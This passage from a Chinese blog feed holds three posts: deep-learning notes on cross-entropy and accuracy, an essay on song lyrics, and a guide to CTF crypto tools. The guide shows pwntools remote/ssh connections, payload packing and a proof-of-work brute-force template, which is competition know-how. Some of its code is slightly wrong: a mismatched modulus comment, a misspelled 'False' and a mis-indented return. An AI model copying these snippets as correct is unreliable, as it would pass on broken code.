]”的形式访问数组时，会将第一个花式索引对应数组或列表的各元素作为行索引，将第二个花式索引对应数组或列表的各元素作为列索引，再按照“二维数组 [ 行索引 , 列索引 ]”的形式获取对应位置的元素。例如，使用两个花式索引访问二维数组 array_2d 的元素，代码如下：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用两个花式索引访问元素</span></span><br><span class="line"><span class="built_in">print</span>(array_2d[[<span class="number">0</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">1</span>]])</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">2</span> <span class="number">8</span>]</span><br></pre></td></tr></table></figure><p>上述与二维数组相关的花式索引操作的示意如图：</p><p><img src="/posts/901c6f233b3c/v2-083bae7d7ed496acf5833b1123a195b8_720w.jpg" class="" title="img"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>我们只需一行代码就可以[<strong>实现交叉熵损失函数</strong>]:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy</span>(<span class="params">y_hat, y</span>):</span><br><span class="line">    <span class="keyword">return</span> - torch.log(y_hat[<span class="built_in">range</span>(<span class="built_in">len</span>(y_hat)), y])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>计算精度</strong></p><p>为了计算精度，我们执行以下操作。 首先，如果<code>y_hat</code>是矩阵，那么假定第二个维度存储每个类的预测分数。 我们使用<code>argmax</code>获得每行中最大元素的索引来获得预测类别。 然后我们[<strong>将预测类别与真实<code>y</code>元素进行比较</strong>]。 由于等式运算符“<code>==</code>”对数据类型很敏感， 因此我们将<code>y_hat</code>的数据类型转换为与<code>y</code>的数据类型一致。 结果是一个包含0（错）和1（对）的张量。 最后，我们求和会得到正确预测的数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">accuracy</span>(<span class="params">y_hat, y</span>):  <span class="comment">#@save</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(y_hat.shape) &gt; <span class="number">1</span> <span class="keyword">and</span> y_hat.shape[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">        y_hat = y_hat.argmax(axis=<span class="number">1</span>)</span><br><span class="line">    cmp = y_hat.<span class="built_in">type</span>(y.dtype) == y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">float</span>(cmp.<span class="built_in">type</span>(y.dtype).<span class="built_in">sum</span>())</span><br></pre></td></tr></table></figure><h4 id="简洁实现-1"><a href="#简洁实现-1" class="headerlink" title="简洁实现"></a>简洁实现</h4><ul><li>损失函数使用nn.CrossEntropyLoss函数</li></ul>]]></content>
      
      
      <categories>
          
          <category> 《动手学深度学习》系列笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简析《爱爱爱》(方大同)</title>
      <link href="/posts/3dd78927ff1e/"/>
      <url>/posts/3dd78927ff1e/</url>
      
        <content type="html"><![CDATA[<h2 id="R-amp-B"><a href="#R-amp-B" class="headerlink" title="R&amp;B"></a>R&amp;B</h2><p>青少年时听歌主打一个只听节奏，所以那时迷上了欧美流行乐</p><p>后来常和朋友去KTV比拼歌技，便慢慢听回了华语歌</p><p>但是早年对节奏感的享受感官已深埋在我的<strong>music soul</strong>当中，也让我格外钟爱带有<strong>R&amp;B</strong>元素的歌曲</p><div class="note info flat"><p><strong>节奏蓝调</strong>（英语：<strong>rhythm and blues</strong>，英文简称：<strong>R&amp;B</strong>或<strong>RnB</strong>），是一种<a href="https://zh.wikipedia.org/wiki/美国">美国</a><a href="https://zh.wikipedia.org/wiki/非裔">非裔</a><a href="https://zh.wikipedia.org/wiki/艺术家">艺术家</a>首先采用，并融合了<a href="https://zh.wikipedia.org/wiki/爵士乐">爵士乐</a>、<a href="https://zh.wikipedia.org/wiki/福音音乐">福音音乐</a>和<a href="https://zh.wikipedia.org/wiki/蓝调音乐">蓝调音乐</a>的音乐形式。这个音乐术语是由美国<a href="https://zh.wikipedia.org/wiki/告示牌_(雜誌">告示牌</a>)（Billboard）于1940年代末所提出。</p></div><h2 id="诗？"><a href="#诗？" class="headerlink" title="诗？"></a>诗？</h2><p>也许是因为母语的亲切感，平时顺口哼两句的更多是华语歌</p><p>或许是因为这一两句的旋律更加入脑？但我想更多的还是因为我的潜意识接受了它们，想要让我在“反刍后”，细细玩味它们</p><p>能<strong>让我记住的歌词</strong>不多，而且往往它们还有一些<strong>共性</strong>：</p><ol><li>由两个以上单句组成的复句。</li><li>单押或句式结构相近。</li><li>有一定涵义、暗示或者映射，而非口水话。</li><li>与歌词的上下文没有紧密联系，可以单独拿出来分析。</li></ol><p>细细比较，这些歌词其实和古代的<strong>诗</strong>歌曲艺很像</p><p>想来也是，其实古人早就已经找到了解决诗歌传唱度的方法</p><p>每次我想起并哼唱出来时，不但加深了对这些歌的印象，更会主动去体会歌词的涵义</p><p>而越隐晦的歌词则越值得把玩。</p><p><strong><em>爱爱爱</em></strong> 正好有一句歌词符合上面的标准。</p><h3 id="有一天翻开辞海找不到爱"><a href="#有一天翻开辞海找不到爱" class="headerlink" title="有一天翻开辞海找不到爱"></a>有一天翻开辞海找不到爱</h3><p>这句话也许是表达作者在感情上经历了挫折或者失望，感到爱情变得稀缺或者无法实现。将爱情比作在辞海中查找的词汇，暗示着无法找到真正的爱情。</p><p>但我更倾向于理解为：</p><div class="note no-icon flat"><p>在某一天，当我们尝试通过定义和解释来寻找爱的意义时，却无法在辞典或书籍中找到确切的答案。因为爱是一种深刻的情感体验，无法被简单地定义或解释。</p></div><h4 id="爱很简单？"><a href="#爱很简单？" class="headerlink" title="爱很简单？"></a>爱很简单？</h4><p>陶喆说：<em>爱很简单</em>。诚然，爱并不需要复杂的条件和要求，而是一种纯粹的感情和情感交流。爱是一种简单而美好的东西，不需要过多的修饰和掩饰。但意识到这一点的路上往往并不简单。</p><div class="note info flat"><p><strong><em>爱， 很简单</em></strong>是由<a href="https://baike.baidu.com/item/娃娃/8362371?fromModule=lemma_inlink">娃娃</a>填词，<a href="https://baike.baidu.com/item/陶喆/120592?fromModule=lemma_inlink">陶喆</a>作曲、编曲并演唱的一首<strong>代表作</strong>），收录于陶喆1997年12月6日发行的同名专辑《David Tao》中。</p><p><img class="inline-img" src="/2023-7-24/%E7%88%B1%E5%BE%88%E7%AE%80%E5%8D%95.png" style="height:100px" /></p><details class="toggle" ><summary class="toggle-button" style="">完整歌词</summary><div class="toggle-content"><p>忘了是怎么开始</p><p>也许就是对你</p><p>有一种感觉</p><p>忽然间发现自己</p><p>已深深爱上你</p><p>真的很简单</p><p>爱的地暗天黑 都已无所谓</p><p>是是非非无法抉择</p><p>没有后悔 为爱日夜去跟随</p><p>那个疯狂的人是我</p><p>I love you</p><p>无法不爱你 Baby</p><p>说你也爱我</p><p>I love you</p><p>永远不愿意 Baby 失去你</p><p>不可能更快乐</p><p>只要能在一起</p><p>做什么都可以</p><p>虽然世界变个不停</p><p>用最真诚的心</p><p>让爱变得简单</p><p>爱的地暗天黑 都已无所谓</p><p>是是非非无法抉择</p><p>没有后悔 为爱日夜去跟随</p><p>那个疯狂的人是我</p><p>I love you</p><p>一直在这里 Baby</p><p>一直在爱你</p><p>I love you</p><p>Oh yes I do</p><p>永远都不放弃</p><p>这爱你的权利</p><p>如果你还有一些困惑 Oh no</p><p>请贴着我的心倾听</p><p>听我说着 爱你</p><p>Yes I do</p><p>Come on now</p><p>One more time</p><p>I love you</p><p>Oh yes I do</p><p>一直在这里 Baby oh yeah</p><p>一直在爱你</p><p>I love you</p><p>永远都不放弃</p><p>这爱你的权利。</p></div></details></div><div class="note primary flat"><p>以后有机会，我也会写文章聊聊陶喆的音乐（挖坑</p></div><h3 id="花不开树不摆还是更畅快"><a href="#花不开树不摆还是更畅快" class="headerlink" title="花不开树不摆还是更畅快"></a>花不开树不摆还是更畅快</h3><p>这句话同样可以以一种惆怅的基调来展开：</p><div class="note no-icon flat"><p>花和树可以被理解为生命的象征，而它们的不活跃可能暗示着作者对生活的<strong>失望和无趣</strong>。尽管面对失望和困境，作者选择了更加畅快的方式来面对。作者通过自我解放和积极思考，选择了一种超越物质和现实束缚的自由状态，以寻求内心的满足和快乐。</p></div><p>但如果放眼整首歌，作者是以早已领悟的超然心态娓娓道来，那么这句话也可以像这样理解：</p><div class="note no-icon flat"><p>花朵开放和树木摇曳是自然界中美丽而常见的景象。但歌词表达了一种对于超越这些常规的追求：只有在摆脱这些限制和期待之后，才能真正感受到内心的畅快和<strong>自由</strong>。</p></div><div class="note warning flat"><p>当然这些都是我个人的解读</p><p>“There are a thousand Hamlets in a thousand people’s eyes.”</p></div><h3 id="爱-自由？"><a href="#爱-自由？" class="headerlink" title="爱=自由？"></a>爱=自由？</h3><p>我的回答是YES</p><p>当你踏遍花田，心中关心的还是那个<strong>ta</strong>，这就是自由，这就是爱。</p><p>同时，就像这首歌的另一句歌词 <em>我爱故我在</em>，每个人都有爱与被爱的权利。勇敢爱、简单爱、自由爱。</p><h2 id="感同身受"><a href="#感同身受" class="headerlink" title="感同身受"></a>感同身受</h2><p>很多时候，我都强调潜意识对人存在影响这一事实。分析很多问题时，我也喜欢把<strong>潜意识</strong>一并纳入分析对象。</p><p>为什么我会对这首歌有感触？</p><p>第一次听到这首歌时，也许我并没有太在意歌词，而是被它的旋律留住。</p><p>那为什么我会主动去感受这首歌？</p><p>我想应该是<strong>潜意识</strong>的作用。</p><p>潜意识里的记忆与歌词产生了联系，并把歌词记录在我的脑海，期待有朝一日将我唤醒……</p><link rel="stylesheet" href="https://rickliu.com/music/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>        <div id="aplayer-WpIfqvJg" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;"></div>  <script>  var options = {"narrow":false,"autoplay":true,"showlrc":3,"mode":"order","mutex":true,"theme":"#ad7a86","preload":"metadata","listmaxheight":"513px","music":[{"title":"爱爱爱","author":"方大同","url":"/music/index/方大同-爱爱爱.mp3","pic":"/music/index/方大同-爱爱爱.png","lrc":"/music/方大同 - 爱爱爱.lrc"}]};  options.element = document.getElementById("aplayer-WpIfqvJg");  var ap = new APlayer(options);    window.aplayers || (window.aplayers = []);  window.aplayers.push(ap);  </script>]]></content>
      
      
      <categories>
          
          <category> 音乐简评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto常用库和工具</title>
      <link href="/posts/85875867f561/"/>
      <url>/posts/85875867f561/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto常用的python库"><a href="#Crypto常用的python库" class="headerlink" title="Crypto常用的python库"></a>Crypto常用的python库</h2><h3 id="常用库函数功能"><a href="#常用库函数功能" class="headerlink" title="常用库函数功能"></a>常用库函数功能</h3><h4 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h4><ul><li><p>安装指令：<code>pip install gmpy2</code></p></li><li><p>使用场景：一些大整数运算，特别是在RSA中。</p><ul><li><p><strong>初始化大整数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.mpz(<span class="number">909090</span>)</span><br><span class="line">   </span><br><span class="line">result:mpz(<span class="number">909090</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>求大整数a,b的最大公因数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.gcd(<span class="number">6</span>,<span class="number">18</span>)</span><br><span class="line">   </span><br><span class="line">result:mpz(<span class="number">6</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>求大整数x模m的逆元y</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#4*6 ≡ 1 mod 23</span></span><br><span class="line">gmpy2.invert(<span class="number">4</span>,<span class="number">23</span>)</span><br><span class="line">   </span><br><span class="line">result:mpz(<span class="number">6</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>检验大整数是否为偶数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_even(<span class="number">6</span>)</span><br><span class="line">   </span><br><span class="line">result:<span class="literal">True</span></span><br><span class="line">   </span><br><span class="line">-----------</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_even(<span class="number">7</span>)</span><br><span class="line">   </span><br><span class="line">result:<span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p><strong>检验大整数是否为奇数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_odd(<span class="number">6</span>)</span><br><span class="line">   </span><br><span class="line">result:<span class="literal">False</span></span><br><span class="line">   </span><br><span class="line">-----------</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_odd(<span class="number">7</span>)</span><br><span class="line">   </span><br><span class="line">result:<span class="literal">True</span></span><br></pre></td></tr></table></figure></li><li><p><strong>检验大整数是否为素数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.is_prime(<span class="number">5</span>)</span><br><span class="line">   </span><br><span class="line">result:<span class="literal">True</span></span><br></pre></td></tr></table></figure></li><li><p><strong>求大整数x开n次根</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.iroot(<span class="number">81</span>,<span class="number">2</span>)</span><br><span class="line">   </span><br><span class="line">result:(mpz(<span class="number">9</span>),<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>求大整数x的y次幂模m取余</strong>(主要用于RSA)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#2^4 mod 5 </span></span><br><span class="line">gmpy2.powmod(<span class="number">2</span>,<span class="number">4</span>,<span class="number">15</span>)</span><br><span class="line">   </span><br><span class="line">result:mpz(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h4><ul><li><p>安装指令：<code>pip install pwntools</code></p></li><li><p>使用场景： 不仅是在<strong>Pwn</strong>方向上的神器，pwntools在<strong>Crypto</strong>中也能用来绕过pow(proof of work)共识机制、向提供的ip端口发送payload以及快速编写exp。</p><ul><li><p><strong>基础用法</strong>：</p><p>首先就是<strong>导入包</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>你将在全局空间里引用pwntools的所有函数。现在可以用一些简单函数进行<code>汇编</code>，<code>反汇编</code>，<code>pack</code>，<code>unpack</code>等等操作。<br>将包导入后，我一般都会<strong>设置日志记录级别</strong>，方便出现问题的时候排查错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br></pre></td></tr></table></figure><p>这样设置后，通过管道发送和接收的数据都会被打印在屏幕上。<br>然后就是<strong>连接</strong>了，一般题目都会给你一个<code>ip</code>和一个<code>端口</code>，让你用<code>nc连接</code>访问，也有的题是让你通过<code>ssh连接</code>，这两种方式都可以通过pwntools实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种连接方式，通过ip和port去连接</span></span><br><span class="line">conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)  </span><br><span class="line"><span class="comment"># 第二种连接方式，通过ssh连接</span></span><br><span class="line">shell = ssh(host=<span class="string">&#x27;192.168.14.144&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="comment"># 也可将可执行文件下载到本地进行调试</span></span><br><span class="line">conn = process(<span class="string">&#x27;./test&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在编写exp时，最常见的工作就是在整数之间转换，而且转换后，它们的表现形式就是一个字节序列，pwntools提供了<strong>打包函数</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32/p64: 打包一个整数，分别打包为32位或64位</span><br><span class="line">u32/u64: 解包一个字符串，得到整数</span><br></pre></td></tr></table></figure><p>具体用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如将0xdeadbeef进行32位的打包，将会得到&#x27;\xef\xbe\xad\xde&#x27;（小端序）</span></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>)  <span class="comment">#pack 32 bits number</span></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>)  <span class="comment">#pack 64 bits number</span></span><br></pre></td></tr></table></figure><p>打包的时候要指定程序是<code>32位</code>还是<code>64位</code>的，他们之间打包后的长度是不同的。<br> 建立连接后就可以<strong>发送和接收数据</strong>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">conn.send(data) <span class="comment">#发送数据</span></span><br><span class="line">conn.sendline(data) <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line"><span class="comment">#接收数据，numb指定接收的字节，timeout指定超时</span></span><br><span class="line">conn.recv(numb = <span class="number">2048</span>, timeout = default)</span><br><span class="line"><span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">conn.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">conn.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle) </span><br><span class="line">conn.recvall()  <span class="comment">#一直接收直到 EOF</span></span><br><span class="line">conn.recvrepeat(timeout = default)  <span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line"><span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line">conn.interactive() </span><br></pre></td></tr></table></figure><p>一般来说做Crypto题目时通过<code>nc连接</code>即可，如果是通过<code>nc连接</code>的话，一进去就相当于开启了一个进程，你只需要发送数据和程序交互就行了。<br> 如果是通过<code>ssh连接</code>进去的，你需要<strong>手动创建一个进程</strong>，就跟正常通过ssh连接一样，你需要打开一个程序。<br> 比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;shell = ssh(host=<span class="string">&#x27;192.168.14.144&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="comment"># 也可以用shell.process(&#x27;/bin/sh&#x27;) 来实现，但是前提是服务器有python2的 interpreter，否则会报错，优先使用shell.run()</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh = shell.run(<span class="string">&#x27;/bin/sh&#x27;</span>)        <span class="comment"># 创建进程，这里开了一个shell</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh.sendline(<span class="string">&#x27;sleep 3; echo hello world;&#x27;</span>)  <span class="comment"># 发送命令</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh.recvline(timeout=<span class="number">1</span>)         <span class="comment"># 接收数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh.recvline(timeout=<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;hello world\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh.close()                     <span class="comment"># 关闭进程</span></span><br></pre></td></tr></table></figure></li><li><p><strong>绕过pow共识机制</strong>:</p><p>本质就是去爆破前四位拿到相同的sha256结果，在Crypto题目中比较常用，一些新手可能会被难住</p><p>以下是通用模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#定义字母表</span></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="comment">#定义PoW函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>(<span class="params">hash_value, part</span>):</span><br><span class="line">    alphabet = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(alphabet, repeat=<span class="number">4</span>):</span><br><span class="line">        nonce = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line">        <span class="keyword">if</span> sha256((nonce + part.decode()).encode()).hexdigest() == hash_value.decode():</span><br><span class="line">        <span class="keyword">return</span> nonce</span><br><span class="line">conn = remote(<span class="string">&#x27;ip&#x27;</span>, 端口)</span><br><span class="line">msg = conn.recvuntil(<span class="string">b&#x27;Plz tell me XXXX:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">part = msg[<span class="number">12</span>:<span class="number">28</span>]</span><br><span class="line">hashvalue = msg[<span class="number">33</span>:-<span class="number">18</span>]</span><br><span class="line"><span class="built_in">print</span>(part, hashvalue)</span><br><span class="line">nonce = PoW(hashvalue, part)</span><br><span class="line"><span class="built_in">print</span>(nonce)</span><br><span class="line">conn.sendline(nonce.encode())</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="hashlib"><a href="#hashlib" class="headerlink" title="hashlib"></a>hashlib</h4><ul><li><p>安装指令：从Python2.7开始python环境就已经自带，无需安装</p></li><li><p>使用场景：hashlib 支持的加密算法有：md5、sha1、sha256 和 sha512。加密复杂度和花费时间依次增加。</p><ul><li><p><strong>基础用法</strong>：</p><p>简单的加密操作为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">md5 = hashlib.md5()    <span class="comment"># 选择加密方式，初始化一个加密</span></span><br><span class="line">md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))    <span class="comment"># 将要加密的内容，添加到m中</span></span><br><span class="line"><span class="built_in">print</span>(md5.hexdigest())</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_md5=hashlib.md5(s.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>同样的内容使用同样的方法加密，即便使用不同的方式编码，最终加密出来的结果也是相同的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">sha256 = hashlib.sha256()</span><br><span class="line">sha256.update(<span class="string">&#x27;wusir&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(sha256.hexdigest())</span><br><span class="line">sha256 = hashlib.sha256()</span><br><span class="line">sha256.update(<span class="string">&#x27;wusir&#x27;</span>.encode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(sha256.hexdigest())</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="ciphey"><a href="#ciphey" class="headerlink" title="ciphey"></a>ciphey</h4><ul><li><p>安装指令：<code>pip install -U ciphey</code> </p><div class="note primary flat"><p>  该库在安装中存在一个可能遇到的问题：</p>  <details class="toggle" ><summary class="toggle-button" style="">ciphey在windows的安装问题</summary><div class="toggle-content"><p>如果出现编码问题：<code>&#39;gbk&#39; codec can&#39;t decode byte 0xbf in position 695’</code>如下图：</p><p><img src="/posts/85875867f561/2543646-20211010095554146-1138464446.png" class="" title="img"></p><p>解决方法如下：</p><ol><li><p>找到pywhat这个包的位置，一般是在你的python安装目录下：….\python3\Lib\site-packages\pywhat</p></li><li><p>在该目录下找到：regex<em>identifier.py这个文件，把 <em>_init</em></em>()函数内的<code>with open(fullpath,&quot;r&quot;)</code> 改为<code>with open(fullpath,&quot;rb&quot;)</code> 即可，如下图：</p></li></ol><p><img src="/posts/85875867f561/2543646-20211010095924618-247223677.png" class="" title="img"></p><p>参考链接： <a href="https://www.cnblogs.com/913t-sec/p/15388684.html">Ciphey在windows下的安装问题（’gbk’ codec can’t decode byte 0xbf in position 695）</a></p></div></details></div><div class="note warning flat"><p>安装要求：python版本$\le$3.8</p></div></li><li><p>使用场景： 不仅是在<strong>Misc</strong>方向上的神器，ciphey在<strong>Crypto</strong>中也能用来简单分析第一眼无法看出来的密文，由于<strong>使用自然语言处理和人工智能</strong>，它在分析使用的加密方法上功能非常强大，但是经过本人测试，其在某些场景也存在局限性，在下文介绍完使用方法后会具体介绍。</p><ul><li><p><strong>基础用法</strong>：</p><p>在终端或者cmd进入安装了ciphey的虚拟环境，可以通过文件输入或直接输入密文：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件输入</span></span><br><span class="line">ciphey -f encrypted.txt  </span><br><span class="line">python -m ciphey -f encrypted.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接输入密文</span></span><br><span class="line">ciphey -t &quot;Encrypted input&quot;  &amp;</span><br><span class="line">python -m ciphey -t 